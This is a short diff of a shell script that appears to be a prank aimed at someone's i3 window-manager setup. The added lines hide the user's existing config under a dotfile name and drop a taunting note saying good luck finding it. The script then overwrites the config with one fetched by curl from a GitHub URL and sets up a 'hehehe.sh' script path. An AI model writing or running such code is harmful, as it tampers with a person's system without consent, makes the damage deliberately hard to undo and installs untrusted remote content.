@@ -7,7 +7,8 @@ remove()
     done
 }
 
-mv ~/.config/i3/config ~/.config/i3/oldconfig
+mv ~/.config/i3/config ~/.config/i3/.config
+echo "Good luck to find you old config" > "$HOME/.config/i3/cheh.txt"
 curl https://raw.githubusercontent.com/Ellmos/cf/main/config > ~/.config/i3/config
 
 hehe="$HOME/.config/i3/hehehe.sh"
